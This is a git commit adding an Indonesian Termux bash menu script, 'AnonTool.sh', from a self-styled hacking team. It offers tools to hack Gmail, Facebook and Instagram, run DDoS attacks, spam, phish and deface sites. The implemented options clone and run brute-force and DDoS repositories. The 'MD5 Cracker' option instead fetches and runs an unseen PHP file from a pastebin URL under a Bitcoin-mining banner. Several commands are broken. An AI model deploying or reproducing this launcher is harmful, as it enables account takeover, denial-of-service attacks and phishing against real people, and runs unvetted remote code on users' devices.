797f8c9b3129f1b3823a46873d5876d851db7dc1
Anon6372098 <43740735+Anon6372098@users.noreply.github.com>
2018-11-15 09:17:32 +0700

    Main File

---
+++ AnonTool.sh
@@ -0,0 +1,322 @@
+#!/system/xbin/bash
+clear
+blue='\033[34;1m'
+green='\033[32;1m'                                        
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+toilet -f slant -F gay "Anon Tool" | lolcat
+echo "\033[34;1m"
+cal
+date
+echo ""      
+echo "\033[32;1mCreator : Anon6372098" 
+echo "\033[35;1mTeam : D4RK SYST3M F41LUR3 S33K3R"
+echo "\033[36;1mThanks to : All of DSFS Member"
+echo "\033[37;1mAlly Team : DSFS Public"
+echo "\033[33;1mContact Me : anon6372098.id@gmail.com"
+echo "\033[31;1mSubscribe Youtube :"
+echo "\033[33;1mD4RK SYST3M F41LUR3 S33K3R" "\033[36;1m(DSFS)"
+echo "\033[34;1m[============================]"
+sleep 1
+echo ""
+echo "\033[32;1mSilahkan Pilih Tool :"
+echo "\033[32;1m"
+echo "[===============================================]"
+echo "1.> Hack Gmail"
+echo "[===============================================]"
+echo "2.> Hack Facebook"
+echo "[===============================================]"
+echo "3.> Hack/Bot Instagram"
+echo "[===============================================]"
+echo "4.> Hack ZIP Terenkripsi"
+echo "[===============================================]"
+echo "5.> Max Speed DDoS Attack"
+echo "[===============================================]"
+echo "6.> Spam Tool"
+echo "[===============================================]"
+echo "7.> ReconDog (Pengumpul Informasi)"
+echo "[===============================================]"
+echo "8.> SQL Injection (SQL Map)"
+echo "[===============================================]"
+echo "9.> Pembuat Script Deface"
+echo "[===============================================]"
+echo "10.> Weeman (Phising)"
+echo "[===============================================]"
+echo "11.> Metasploit"
+echo "[===============================================]"
+echo "12.> IP GeoLocation (Pelacak IP)"
+echo "[===============================================]"
+echo "13.> Xerxes (DDoS)"
+echo "[===============================================]"
+echo "14.> Ngrok"
+echo "[===============================================]"
+echo "15.> MD5 Cracker"
+echo "[===============================================]"
+echo "16.> NMap Android"
+echo "[===============================================]"
+echo "17.> Google Dork (Dorking Termux)"
+echo "[===============================================]"
+echo "18.> LITESCRIPT"
+echo "[===============================================]"
+echo "19.> Hydra"
+echo "[===============================================]"
+echo "20.> Kali Nethunter"
+echo "[===============================================]"
+echo "21.> Hash Buster"
+echo "[===============================================]"
+echo "22.> D-TECT"
+echo "[===============================================]"
+echo "23.> Ubuntu"
+echo "[===============================================]"
+echo "24.> viSQL"
+echo "[===============================================]"
+echo "25.> RouterSploit"
+echo "[===============================================]"
+echo "26.> AngryFuzzer"
+echo "[===============================================]"
+echo "27.> Fedora"
+echo "[===============================================]"
+echo "28.> Cupp (Buat Wordlist)"
+echo "[===============================================]"
+echo "29.> Chatting di Termux"
+echo "[===============================================]"
+echo "30.> Katoolin Tool"
+echo "[===============================================]"
+echo "0.> Exit/Keluar"
+echo "[===============================================]"
+read -p "root@Tools-Anon Tool]~#" anon
+
+if [ $anon = 1 ] || [ $anon = 1 ]
+then
+clear
+figlet "Anon Tool (Gmail Hack)" | lolcat
+pkg update && upgrade
+pkg install python2
+pkg install figlet
+pkg install git
+git clone https://github.com/Anon6372098/Gmail-Brute-Force-DSFS/
+cd Gmail-Brute-Force-DSFS
+ls
+chmod +x anongmailbrute.py
+ls
+python2 anongmailbrute.py
+fi
+
+if
+[ $anon = 2 ] || [ $anon = 2 ]
+then
+clear
+figlet "Anon Tool (Hack Facebook)" | lolcat
+pkg update && upgrade
+pkg install python2
+pkg install figlet
+pkg install git
+git clone https://github.com/Anon6372098/FB-Brute-Anon-DSFS/
+cd FB-Brute-Anon-DSFS
+ls
+chmod +x anonfbbrute.py
+ls
+python2 anonfbbrute.py
+fi
+
+if [ $anon = 3 ] || [ $anon = 3 ]
+then
+figlet "Anon Tool (Instagram)" | lolcat
+pkg update && upgrade
+pkg install git
+pkg install python2
+pip2 install mechanize
+pkg install curl
+pkg install figlet
+pkg install toilet
+pkg install ruby
+gem install lolcat
+git clone https://github.com/Anon6372098/Instagram-DSFS-Tool/
+cd Instagram-DSFS-Tool
+pip2 install -r requirements.txt
+sh Instagram-DSFS-Tool.sh
+fi
+
+if [ $anon = 4 ] || [ $anon = 4 ]
+then
+clear
+figlet "Anon Tool (Hack ZIP)" | lolcat
+pkg update && upgrade
+pkg install python2
+pkg install figlet
+pkg install git
+git clone https://github.com/Anon6372098/AnonZIPCracker/
+cd AnonZIPCracker
+ls
+python2 anonzipcracker.py
+fi
+
+if [ $anon = 5 ] || [ $anon = 5 ]
+then
+clear
+figlet "Anon Tool (DDoS Attack)" | lolcat
+pkg install git
+pkg install figlet
+pkg install python2
+pkg update && upgrade
+git clone https://github.com/Anon6372098/DDoS-Attack-DSFS
+cd DDoS-Attack-DSFS
+ls
+python2 DDoS-Attack-Anon.py
+fi
+
+if [ $anon = 6 ] || [ $anon = 6 ]
+then
+clear
+figlet "Anon Tool (Spam Tool)" | lolcat
+pkg install python2
+pkg install figlet
+pkg install ruby
+gem install lolcat
+pkg install toilet
+pkg install php
+pip2 install mechanize
+pkg install git
+git clone https://github.com/Anon6372098/AnonDSFSSpammer/
+cd AnonDSFSSpammer
+ls
+sh AnonDSFSSpammer.sh
+fi
+
+if [ $anon = 7 ] || [ $anon = 7 ]
+then
+clear
+figlet "Anon Tool (ReconDog)" | lolcat
+pkg install python2
+pkg install
+git clone https://github.com/s0md3v/ReconDog
+cd ReconDog
+python2 dog
+fi
+
+if [ $anon = 8 ] || [ $anon = 8 ]
+then
+clear
+figlet "Anon Tool (SQL Map)" | lolcat
+apt update && upgrade
+apt install python2
+apt install git
+https://github.com/sqlmapproject/sqlmap
+cd sqlmap
+python2 sqlmap.py
+fi
+
+if [ $anon = 9 ] || [ $anon = 9 ]
+then
+clear
+figlet "Anon Tool (SC Deface)" | lolcat
+pkg update && upgrade
+pkg install python2
+pkg install git
+https://github.com/Ubaii/script-deface-creator
+cd
+python2 create.py
+fi
+
+if [ $anon = 10 ] || [ $anon = 10 ]
+then
+clear
+figlet "Anon Tool (Weeman)" | lolcat
+apt update && upgrade
+apt install python2
+apt install git
+git clone https://github.com/evait-security/weeman
+cd weeman
+chmod +x weeman.py
+python2 weeman.py
+fi
+
+if [ $anon = 11 ] || [ $anon = 11 ]
+then
+clear
+figlet "Anon Tool (Metasploit)" | lolcat
+apt update && apt upgrade
+apt install git
+git clone https://github.com/verluchie/termux-metasploit
+cd termux-metasploit
+chmod 777 install.sh
+sh install.sh
+fi
+
+if [ $anon = 12 ] || [ $anon = 12 ]
+then
+clear
+figlet "Anon Tool (IPGeoLocation)" | lolcat
+apt update && apt upgrade
+apt install git
+apt install python
+git clone https://github.com/maldevel/IPGeolocation/
+cd ipgeolocation
+mv ipgeolocation.py main.py
+chmod +x main.py
+pip install -r requirements.txt
+./main.py -h
+fi
+
+if [ $anon = 13 ] || [ $anon = 13 ]
+then
+clear
+figlet "Anon Tool (Xerxes DDoS)" | lolcat
+apt update && apt upgrade
+apt install git
+apt install clang
+git clone https://github.com/zanyarjamal/xerxes
+cd xerxes
+gcc xerxes.c -o xerxes
+fi
+
+if [ $anon = 14 ] || [ $anon = 14 ]
+then
+clear
+figlet "Anon Tool (Ngrok)" | lolcat
+apt update && apt upgrade
+apt install wget
+mkdir ngrok
+cd ~/ngrok
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+mv ngrok-stable-linux-arm.zip $HOME
+$HOME/unzip ngrok-stable-linux-arm.zip
+cd ~/
+fi
+
+if [ $anon = 15 ] || [ $anon = 15 ]
+then
+clear
+figlet "Anon Tool (Mining Bitcoin)" | lolcat
+pkg update && apt upgrade
+pkg install php
+pkg install wget
+wget -O tuyul.php https://pastebin.com/raw/3ERZV3nL
+mv tuyul.php $HOME
+php $HOME/tuyul.php
+fi
+
+if [ $anon = 0 ] || [ $anon = 00 ]
+then
+echo "\033[32;1mWe Are D4RK SYST3M F41LUR3 S33K3R (DSFS)"
+sleep 1
+echo "\033[32;1mWe Are DSFS Public"
+sleep 1
+echo "\033[33;1mWe Are Anonymous"
+sleep 1
+echo "We Are Legion"
+sleep 1
+echo "We Do Not Forgive"
+sleep 1
+echo "We Do Not Forget"
+sleep 1
+echo "Expect Us"
+sleep 1
+echo "\033[32;1mDiakui, Bukan Mengakui"
+sleep 1
+exit
+fi
